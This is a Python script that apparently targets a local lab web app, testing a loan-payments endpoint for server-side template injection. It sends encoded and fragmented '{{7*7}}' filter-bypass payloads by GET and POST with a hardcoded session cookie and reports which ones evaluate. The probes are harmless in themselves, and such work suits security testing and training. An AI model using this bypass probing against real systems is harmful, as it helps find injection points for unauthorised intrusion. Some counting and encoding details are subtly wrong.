import requests
import json
import urllib.parse

# Configuration
target_url = "http://127.0.0.1:32790/total_loan_payments"
session_cookie = "session=eyJ1c2VyX2lkIjoxfQ.aVlvKQ.Ahoc9Ula-DnHQaF2W1Cj0InvBaA"
headers = {
    "Cookie": session_cookie,
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
}

# Test payloads with different encoding/fragmentation techniques
payloads = {
    "original": "{{7*7}}",
    "html_comment": "<!--{{7*7}}-->",
    "string_concat": "{{'{{' + '7*7' + '}}}}",
    "fragmented": "{{7*7 }}",
    "alternative_delim": "${7*7}",
    "url_encoded_std": "%7B%7B7*7%7D%7D",
    "url_encoded_aggressive": "%25257B%25257B7*72525257D%25257D",
    "nested_json": '{"key": "{{7*7}}"}'
}

print("Testing /total_loan_payments for template rendering bypass")
print("="*60)
print(f"Target: {target_url}")
print("="*60)

# Test 1: GET requests with query parameters
print("\n[+] TESTING GET REQUESTS (query parameters)")
print("-" * 60)

get_results = []

for name, payload in payloads.items():
    print(f"\n[*] Testing: {name}")
    print(f"Payload: {payload}")
    
    try:
        # URL encode the payload for query parameter
        encoded_payload = urllib.parse.quote(payload)
        full_url = f"{target_url}?param={encoded_payload}"
        
        response = requests.get(full_url, headers=headers, timeout=10)
        
        # Check for filter triggers
        filter_triggered = any(word in response.text.lower() for word in ["forbidden", "blocked", "denied", "invalid"])
        
        # Check for template execution (should show 49 if executed)
        executed = "49" in response.text
        
        # Check if JSON is valid
        try:
            json.loads(response.text)
            json_valid = True
        except:
            json_valid = False
        
        print(f"Status: {response.status_code}")
        print(f"Filter triggered: {filter_triggered}")
        print(f"Template executed (49 found): {executed}")
        print(f"JSON valid: {json_valid}")
        print(f"Response preview: {response.text[:200]}")
        
        get_results.append({
            "name": name,
            "payload": payload,
            "status": response.status_code,
            "filtered": filter_triggered,
            "executed": executed,
            "json_valid": json_valid
        })
        
    except Exception as e:
        print(f"Error: {e}")
        get_results.append({
            "name": name,
            "payload": payload,
            "status": "ERROR",
            "filtered": False,
            "executed": False,
            "json_valid": False
        })

# Test 2: POST with application/json
print("\n" + "="*60)
print("[+] TESTING POST REQUESTS (application/json)")
print("-" * 60)

post_results = []

for name, payload in payloads.items():
    print(f"\n[*] Testing: {name}")
    print(f"Payload: {payload}")
    
    try:
        # Prepare JSON headers
        json_headers = headers.copy()
        json_headers["Content-Type"] = "application/json"
        
        # Send payload in JSON body
        if name == "nested_json":
            # This one is already formatted as JSON
            json_data = json.loads(payload)
        else:
            # Send as parameter in JSON
            json_data = {"param": payload}
        
        response = requests.post(target_url, headers=json_headers, json=json_data, timeout=10)
        
        # Check for filter triggers
        filter_triggered = any(word in response.text.lower() for word in ["forbidden", "blocked", "denied", "invalid"])
        
        # Check for template execution
        executed = "49" in response.text
        
        # Check if JSON is valid
        try:
            json.loads(response.text)
            json_valid = True
        except:
            json_valid = False
        
        print(f"Status: {response.status_code}")
        print(f"Filter triggered: {filter_triggered}")
        print(f"Template executed (49 found): {executed}")
        print(f"JSON valid: {json_valid}")
        print(f"Response preview: {response.text[:200]}")
        
        post_results.append({
            "name": name,
            "payload": payload,
            "status": response.status_code,
            "filtered": filter_triggered,
            "executed": executed,
            "json_valid": json_valid
        })
        
    except Exception as e:
        print(f"Error: {e}")
        post_results.append({
            "name": name,
            "payload": payload,
            "status": "ERROR",
            "filtered": False,
            "executed": False,
            "json_valid": False
        })

# Summary
print("\n" + "="*60)
print("[+] SUMMARY OF RESULTS")
print("="*60)

print("\nGET Request Results:")
print(f"{'Name':<20} {'Status':<6} {'Filter':<6} {'Exec':<4} {'JSON':<4}")
print("-"*60)
for result in get_results:
    print(f"{result['name']:<20} {str(result['status']):<6} {str(result['filtered']):<6} {str(result['executed']):<4} {str(result['json_valid']):<4}")

print("\nPOST Request Results:")
print(f"{'Name':<20} {'Status':<6} {'Filter':<6} {'Exec':<4} {'JSON':<4}")
print("-"*60)
for result in post_results:
    print(f"{result['name']:<20} {str(result['status']):<6} {str(result['filtered']):<6} {str(result['executed']):<4} {str(result['json_valid']):<4}")

# Count execution successes
executed_get = sum(1 for r in get_results if r["executed"])
executed_post = sum(1 for r in post_results if r["executed"])
filtered_get = sum(1 for r in get_results if r["executed"])
filtered_post = sum(1 for r in post_results if r["filtered"])

print(f"\nTemplate Executions:")
print(f"  GET method:  {executed_get} / {len(get_results)} successful")
print(f"  POST method: {executed_post} / {len(post_results)} successful")

print(f"\nFilter Triggers:")
print(f"  GET method:  {sum(1 for r in get_results if r['filtered'])} / {len(get_results)}")
print(f"  POST method: {sum(1 for r in post_results if r['filtered'])} / {len(post_results)}")

if executed_get > 0 or executed_post > 0:
    print(f"\n[!] SUCCESS: Template execution detected!")
    # List which ones worked
    for r in get_results:
        if r["executed"]:
            print(f"  - GET {r['name']}: {r['payload']}")
    for r in post_results:
        if r["executed"]:
            print(f"  - POST {r['name']}: {r['payload']}")
else:
    print(f"\n[-] No template execution detected in tested methods")

print("\n" + "="*60)
